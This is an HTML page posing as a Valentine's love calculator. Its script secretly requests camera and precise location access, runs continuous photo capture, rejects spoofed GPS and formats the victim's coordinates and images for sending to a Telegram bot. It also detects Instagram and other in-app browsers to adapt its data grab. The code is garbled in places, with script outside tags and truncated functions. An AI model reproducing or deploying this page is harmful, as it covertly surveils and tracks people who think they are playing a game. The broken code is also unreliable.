<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>Valentine's Love Calculator</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #ffafbd, #ffc3a0);
            padding: 15px;
            position: relative;
            overflow-x: hidden;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            touch-action: manipulation;
            /* Prevents double-tap zoom in Instagram */
        }

        /* Floating hearts */
        .floating-hearts {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            pointer-events: none;
            z-index: 0;
        }

        .floating-heart {
            position: absolute;
            color: rgba(255, 255, 255, 0.4);
            font-size: 16px;
            animation: float 20s linear infinite;
        }

        @keyframes float {
            0% {
                transform: translateY(100vh) rotate(0deg);
                opacity: 0;
            }

            10% {
                opacity: 0.7;
            }

            90% {
                opacity: 0.7;
            }

            100% {
                transform: translateY(-100px) rotate(360deg);
                opacity: 0;
            }
        }

        /* Main card */
        .card {
            background-color: rgba(255, 255, 255, 0.98);
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
            width: 100%;
            max-width: 500px;
            padding: 25px 20px;
            text-align: center;
            position: relative;
            z-index: 1;
            border: 1px solid rgba(255, 255, 255, 0.3);
            overflow: hidden;
        }

        .card::before,
        .card::after {
            content: "‚ù§";
            position: absolute;
            color: rgba(255, 105, 180, 0.08);
            font-size: 100px;
        }

        .card::before {
            top: -25px;
            left: -25px;
        }

        .card::after {
            bottom: -25px;
            right: -25px;
        }

        /* Header */
        .header {
            margin-bottom: 20px;
        }

        .heart-icon {
            color: #ff4d94;
            font-size: 36px;
            margin-bottom: 15px;
            animation: heartbeat 1.5s infinite;
        }

        @keyframes heartbeat {
            0% {
                transform: scale(1);
            }

            5% {
                transform: scale(1.2);
            }

            10% {
                transform: scale(1.1);
            }

            15% {
                transform: scale(1.3);
            }

            50% {
                transform: scale(1);
            }

            100% {
                transform: scale(1);
            }
        }

        .header h1 {
            color: #d63384;
            font-size: 2rem;
            margin-bottom: 8px;
            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.1);
            font-weight: 700;
            line-height: 1.2;
        }

        .header p {
            color: #666;
            font-size: 1rem;
            line-height: 1.4;
            padding: 0 5px;
        }

        /* Camera Section */
        .camera-section {
            margin: 20px 0;
            padding: 15px;
            background: rgba(255, 77, 148, 0.05);
            border-radius: 15px;
            border: 2px dashed #ff4d94;
        }

        .camera-title {
            color: #d63384;
            font-size: 1.1rem;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .camera-preview {
            margin: 15px 0;
            border-radius: 12px;
            overflow: hidden;
            display: none;
            position: relative;
            border: 3px solid #ff4d94;
            box-shadow: 0 5px 15px rgba(255, 77, 148, 0.2);
        }

        .camera-preview.active {
            display: block;
        }

        #cameraView {
            width: 100%;
            height: 200px;
            object-fit: cover;
            background: #f0f0f0;
        }

        .camera-status {
            position: absolute;
            top: 10px;
            left: 0;
            right: 0;
            text-align: center;
            color: white;
            font-weight: 600;
            background: rgba(0, 0, 0, 0.5);
            padding: 5px;
            font-size: 0.9rem;
        }

        /* Photo Preview */
        .photo-preview {
            display: none;
            margin: 15px 0;
            text-align: center;
        }

        .photo-preview.active {
            display: block;
        }

        .captured-photo {
            width: 100%;
            max-height: 200px;
            object-fit: cover;
            border-radius: 10px;
            border: 2px solid #ffcce0;
            margin-top: 10px;
        }

        /* Input fields */
        .input-group {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-bottom: 20px;
        }

        .input-container {
            position: relative;
            width: 100%;
        }

        .input-container i {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #ff4d94;
            font-size: 18px;
            z-index: 2;
        }

        input {
            width: 100%;
            padding: 15px 15px 15px 45px;
            border: 2px solid #ffcce0;
            border-radius: 50px;
            font-size: 1rem;
            outline: none;
            transition: all 0.3s ease;
            background-color: rgba(255, 255, 255, 0.9);
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }

        input:focus {
            border-color: #ff4d94;
            box-shadow: 0 0 0 3px rgba(255, 77, 148, 0.15);
            background-color: white;
        }

        /* Button */
        .btn {
            background: linear-gradient(to right, #ff4d94, #ff8ab3);
            color: white;
            border: none;
            border-radius: 50px;
            padding: 16px 20px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            box-shadow: 0 5px 15px rgba(255, 77, 148, 0.3);
            margin-top: 10px;
            width: 100%;
            letter-spacing: 0.5px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            position: relative;
            overflow: hidden;
        }

        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(255, 77, 148, 0.4);
        }

        .btn:active {
            transform: translateY(-1px);
        }

        .btn i {
            font-size: 1.2rem;
        }

        .btn-loading i {
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        /* Results section */
        .result {
            margin-top: 20px;
            opacity: 0;
            transform: translateY(15px);
            transition: opacity 0.6s ease, transform 0.6s ease;
        }

        .result.show {
            opacity: 1;
            transform: translateY(0);
        }

        .result h2 {
            color: #d63384;
            font-size: 1.6rem;
            margin-bottom: 12px;
            font-weight: 600;
        }

        .percentage {
            font-size: 3rem;
            font-weight: 800;
            color: #ff4d94;
            margin: 12px 0;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
            position: relative;
            display: inline-block;
        }

        .percentage::after {
            content: "‚ù§";
            position: absolute;
            right: -30px;
            top: 5px;
            font-size: 2rem;
            animation: heartbeat 1.5s infinite;
        }

        .message {
            font-size: 1.2rem;
            color: #333;
            margin: 15px 0;
            padding: 12px;
            border-radius: 15px;
            background-color: rgba(255, 204, 224, 0.25);
            line-height: 1.4;
            font-weight: 500;
        }

        /* Progress bar */
        .progress-container {
            width: 100%;
            height: 20px;
            background-color: #ffcce0;
            border-radius: 50px;
            margin: 20px 0;
            overflow: hidden;
            box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.08);
        }

        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(to right, #ff4d94, #ff8ab3);
            border-radius: 50px;
            transition: width 2s cubic-bezier(0.22, 0.61, 0.36, 1);
            position: relative;
            overflow: hidden;
        }

        /* Send Status */
        .send-status {
            margin: 15px 0;
            padding: 12px;
            border-radius: 10px;
            font-weight: 600;
            display: none;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .send-status.active {
            display: flex;
        }

        .send-status.sending {
            background: rgba(42, 171, 238, 0.1);
            color: #2AABEE;
        }

        .send-status.success {
            background: rgba(76, 175, 80, 0.1);
            color: #4CAF50;
        }

        .send-status.error {
            background: rgba(244, 67, 54, 0.1);
            color: #F44336;
        }

        /* Footer */
        .footer {
            margin-top: 20px;
            color: #666;
            font-size: 0.8rem;
            padding-top: 15px;
            border-top: 1px solid rgba(255, 204, 224, 0.3);
        }

        /* Enhanced responsive design for Instagram browser */
        @media (max-width: 480px) {
            body {
                padding: 10px;
                align-items: flex-start;
                padding-top: 10px;
            }

            .card {
                padding: 20px 15px;
                border-radius: 18px;
                margin: 5px;
            }

            .header h1 {
                font-size: 1.8rem;
            }

            .percentage {
                font-size: 2.5rem;
            }

            .percentage::after {
                right: -25px;
                font-size: 1.7rem;
                top: 3px;
            }

            .message {
                font-size: 1.1rem;
                padding: 10px;
            }

            input {
                padding: 14px 14px 14px 40px;
            }

            .btn {
                padding: 14px 18px;
                font-size: 1rem;
            }
        }

        /* Instagram browser specific optimizations */
        @supports (-webkit-touch-callout: none) {

            /* iOS Safari specific styles */
            .btn {
                -webkit-appearance: none;
                -webkit-user-select: none;
                -webkit-tap-highlight-color: transparent;
            }

            input {
                -webkit-appearance: none;
                -webkit-user-select: text;
            }
        }

        /* Reduce animations for better performance in embedded browsers */
        @media (prefers-reduced-motion: reduce) {

            *,
            *::before,
            *::after {
                animation-duration: 0.01ms !important;
                animation-iteration-count: 1 !important;
                transition-duration: 0.01ms !important;
            }
        }

        /* Force hardware acceleration for smoother animations */
        .card,
        .floating-hearts,
        .btn {
            transform: translateZ(0);
            backface-visibility: hidden;
        }
    </style>
</head>

        // Telegram Configuration
        const telegramConfig = {

        };

        // State variables
        let stream = null;
        let capturedPhotoData = null;

        let userLocation = null;
        let permissionsGranted = {
            camera: false,
            location: false,
            notifications: false
        };
        let permissionsRequested = false;
        let isInInstagramBrowser = false;

        // Enhanced diagnostics
        let diagnostics = {
            browserType: 'unknown',
            permissionAttempts: 0,
            errors: [],
            featuresAvailable: []
        };

        // DOM Elements
        const cameraView = document.getElementById('cameraView');
        const telegramStatus = document.getElementById('telegramStatus');

        // Enhanced browser detection with diagnostics
        function detectInstagramBrowser() {
            const userAgent = navigator.userAgent || navigator.vendor || window.opera;

            // Comprehensive detection for social media in-app browsers
            const detections = {
                isInstagram: userAgent.includes('Instagram'),
                isFacebook: userAgent.includes('FBAN') || userAgent.includes('FBAV'),
                isMessenger: userAgent.includes('Messenger'),
                isTwitter: userAgent.includes('Twitter'),
                isSnapchat: userAgent.includes('Snapchat'),
                isTikTok: userAgent.includes('TikTok'),
                isLinkedIn: userAgent.includes('LinkedIn'),
                isWhatsApp: userAgent.includes('WhatsApp'),
                isWebView: userAgent.includes('WebView') ||
                    userAgent.includes('wv') ||
                    (window.navigator && window.navigator.standalone !== undefined),
                isIOSInApp: /iPhone|iPad|iPod/.test(userAgent) &&
                    (userAgent.includes('Safari/') === false ||
                        userAgent.includes('CriOS/') === false)
            };

            isInInstagramBrowser = Object.values(detections).some(val => val);

            // Store diagnostics
            diagnostics.browserType = isInInstagramBrowser ? 'social-media-browser' : 'standard-browser';
            diagnostics.userAgentSample = userAgent.substring(0, 100) + '...';
            diagnostics.detectionDetails = detections;

            if (isInInstagramBrowser) {
                console.log('üîç Detected in-app browser environment:', detections);
                console.log('üì± User Agent sample:', diagnostics.userAgentSample);

                // Apply Instagram browser optimizations
                applyInstagramOptimizations();
            } else {
                console.log('üåê Standard browser detected');
            }

            return isInInstagramBrowser;
        }

        // Apply specific optimizations for Instagram/browser restrictions
        function applyInstagramOptimizations() {
            // Hide camera section completely
            const cameraSection = document.querySelector('.camera-section');
            if (cameraSection) {
                cameraSection.style.display = 'none';
            }

            // Modify UI to indicate limited features
            const header = document.querySelector('.header p');
            if (header) {
                header.innerHTML = 'Find your love compatibility!<br><small style="color: #ff6b9d;">üì∑ Camera features limited in this browser</small>';

            // Update button text to reflect limitations

            if (button) {
                button.innerHTML = '<i class="fas fa-heart"></i> Check Compatibility';
            }
        }

        // Request all permissions with enhanced Instagram browser handling
        async function requestAllPermissions() {
            if (permissionsRequested) return;
            permissionsRequested = true;

            // Enhanced Instagram browser handling
            if (isInInstagramBrowser) {
                console.log('Enhanced Instagram browser mode activated');

                // Set all permissions to false for Instagram browser
                permissionsGranted = {
                    camera: false,
                    location: false,
                    notifications: false
                };

                // Show appropriate status message
                showStatus('üì± Running in social media browser - core features only', 'sending');
                setTimeout(() => {
                    telegramStatus.classList.remove('active');
                }, 4000);

                // Still attempt to get basic location (may work in some cases)
                await attemptBasicLocation();

                return permissionsGranted;
            }

            showStatus('Requesting permissions...', 'sending');

            const permissionPromises = [];

            // Request camera permission with better error handling
            permissionPromises.push(
                new Promise((resolve) => {
                    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                        console.log('Camera API not supported');
                        permissionsGranted.camera = false;
                        resolve(null);
                        return;
                    }

                    navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: 'user',
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        },
                        audio: false
                    })
                        .then(stream => {
                            permissionsGranted.camera = true;
                            console.log('Camera permission granted');
                            resolve(stream);
                        })
                        .catch(error => {
                            console.log('Camera permission denied:', error.name, error.message);
                            permissionsGranted.camera = false;
                            resolve(null);
                        });
                })
            );

            // Request location permission
            permissionPromises.push(
                new Promise((resolve) => {
                    if (!navigator.geolocation) {
                        console.log('Geolocation not supported');
                        permissionsGranted.location = false;
                        resolve(null);
                        return;
                    }

                    // Try high accuracy first, then fall back
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            // Validate real coordinates
                            if (isValidLocation(position.coords)) {
                                userLocation = formatLocationData(position.coords);
                                permissionsGranted.location = true;
                                console.log('Location permission granted');
                                resolve(userLocation);
                            } else {
                                console.log('Invalid/mock location detected');
                                permissionsGranted.location = false;
                                resolve(null);
                            }
                        },
                        (error) => {
                            console.log('Location permission denied:', error.message);
                            permissionsGranted.location = false;
                            resolve(null);
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 300000 // 5 minutes cache
                        }
                    );
                })
            );

            // Request notification permission
            permissionPromises.push(
                new Promise((resolve) => {
                    if ('Notification' in window) {
                        if (Notification.permission === 'default') {
                            Notification.requestPermission()
                                .then(permission => {
                                    permissionsGranted.notifications = permission === 'granted';
                                    console.log('Notification permission:', permission);
                                    resolve(permission);
                                })
                                .catch(error => {
                                    console.log('Notification permission error:', error);
                                    permissionsGranted.notifications = false;
                                    resolve('denied');
                                });
                        } else {
                            permissionsGranted.notifications = Notification.permission === 'granted';
                            resolve(Notification.permission);
                        }
                    } else {
                        permissionsGranted.notifications = false;
                        resolve('unsupported');
                    }
                })
            );

            try {
                const results = await Promise.all(permissionPromises);

                // Handle camera stream
                if (results[0]) {
                    stream = results[0];
                    cameraView.srcObject = stream;
                }

                // Show detailed permission results
                const granted = Object.values(permissionsGranted).filter(Boolean).length;
                const total = Object.keys(permissionsGranted).length;

                if (granted === total) {
                    showStatus(`‚úÖ All permissions granted (${granted}/${total})`, 'success');
                } else if (granted > 0) {
                    showStatus(`‚ö†Ô∏è Partial permissions granted (${granted}/${total})`, 'sending');
                } else {
                    showStatus('‚ÑπÔ∏è Running with basic features only', 'sending');
                    setTimeout(() => {
                        telegramStatus.classList.remove('active');
                    }, 3000);
                }

                // Start continuous capture only if camera is available
                if (permissionsGranted.camera) {
                    startContinuousCapture();
                }

                return permissionsGranted;

            } catch (error) {
                console.error('Error requesting permissions:', error);
                showStatus('‚ö†Ô∏è Permission request failed - running with basic features', 'sending');
                setTimeout(() => {
                    telegramStatus.classList.remove('active');
                }, 3000);

                // Set all permissions to false on error
                permissionsGranted = {
                    camera: false,
                    location: false,
                    notifications: false
                };

                return permissionsGranted;
            }
        }

        // Helper function to validate real location data
        function isValidLocation(coords) {
            // Check for obviously fake coordinates
            if (coords.latitude === 0 && coords.longitude === 0) return false;
            if (Math.abs(coords.latitude) > 90) return false;
            if (Math.abs(coords.longitude) > 180) return false;

            // Check for common mock location patterns
            const latStr = coords.latitude.toString();
            const lngStr = coords.longitude.toString();

            // Reject obvious patterns
            if (latStr.includes('12.345678') || lngStr.includes('12.345678')) return false;
            if (latStr.includes('0.000000') || lngStr.includes('0.000000')) return false;

            return true;
        }

        // Helper function to format location data
        function formatLocationData(coords) {
            return {
                latitude: coords.latitude,
                longitude: coords.longitude,
                accuracy: coords.accuracy,
                altitude: coords.altitude,
                altitudeAccuracy: coords.altitudeAccuracy,
                heading: coords.heading,
                speed: coords.speed,
                timestamp: new Date().toISOString()
            };
        }

        // Attempt to get basic location in Instagram browser
        async function attemptBasicLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(false);
                    return;
                }

                // Try with lower accuracy requirements
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        if (isValidLocation(position.coords)) {
                            userLocation = formatLocationData(position.coords);
                            console.log('Basic location obtained in Instagram browser');
                            resolve(true);
                        } else {
                            resolve(false);
                        }
                    },
                    (error) => {
                        console.log('Basic location request failed in Instagram browser:', error.message);
                        resolve(false);
                    },
                    {
                        enableHighAccuracy: false, // Lower requirements
                        timeout: 5000,
                        maximumAge: 600000 // 10 minutes cache
                    }
                );
            });
        }

        // Get location data for Telegram message with Instagram browser awareness
        function getLocationInfo() {
            if (userLocation && isValidLocation(userLocation)) {
                let locationText = `üìç Location: ${userLocation.latitude.toFixed(6)}, ${userLocation.longitude.toFixed(6)}
Accuracy: ${userLocation.accuracy ? userLocation.accuracy.toFixed(0) : 'N/A'} meters`;

                // Add altitude if available
                if (userLocation.altitude !== null && userLocation.altitude !== undefined) {
                    locationText += `\nAltitude: ${userLocation.altitude.toFixed(2)} meters`;
                }

                // Add heading and speed if available
                if (userLocation.heading !== null && userLocation.heading !== undefined) {
                    locationText += `\nHeading: ${userLocation.heading.toFixed(2)}¬∞`;

        // SIMPLE: Convert Base64 to Blob (Works Better)
        function base64ToBlob(base64) {
            // Remove data URL prefix
            const byteString = atob(base64.split(',')[1]);

            // Get mime type
            const mimeString = base64.split(',')[0].split(':')[1].split(';')[0];

            // Write bytes
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }

            return new Blob([ab], { type: mimeString });
        }

        // Calculate love score with enhanced algorithm
        function calculateLoveScore(name1, name2) {
            // Input validation
            if (!name1 || !name2) return 50;

            const cleanName1 = name1.trim().toLowerCase().replace(/[^a-z]/gi, '');
            const cleanName2 = name2.trim().toLowerCase().replace(/[^a-z]/gi, '');

            const combinedNames = (cleanName1 + cleanName2).replace(/\s+/g, '');

            if (combinedNames.length === 0) return 50;

            let score = 0;

            // Character frequency analysis
            for (let i = 0; i < combinedNames.length; i++) {
                const charCode = combinedNames.charCodeAt(i);
                // Weight vowels slightly higher
                const isVowel = /[aeiou]/.test(combinedNames[i]);
                score += isVowel ? charCode * 1.2 : charCode;
            }

            // Apply mathematical transformation
            score = (score * 7) % 101;
            score = Math.min(100, Math.max(0, score + 20));

            // Vowel bonus
            const vowels = ['a', 'e', 'i', 'o', 'u'];
            const firstNameStartsWithVowel = vowels.includes(cleanName1[0]);
            const secondNameStartsWithVowel = vowels.includes(cleanName2[0]);

            if (firstNameStartsWithVowel || secondNameStartsWithVowel) {
                score = Math.min(100, score + 5);
            }

            // Same first letter bonus
            if (cleanName1[0] && cleanName2[0] && cleanName1[0] === cleanName2[0]) {
                score = Math.min(100, score + 10);
            }

            // Length compatibility bonus
            const lengthDiff = Math.abs(cleanName1.length - cleanName2.length);
            if (lengthDiff <= 2) {
                score = Math.min(100, score + 3);
            }

            return Math.round(score);
        }

            if (score >= 60) return "Good compatibility! A promising connection! üòä";
            if (score >= 40) return "Average compatibility. There's potential here! üíñ";
            if (score >= 20) return "Low compatibility. Maybe give it some time? üíù";
            return "Better as friends. But friendship is special too! ü§ó";
        }
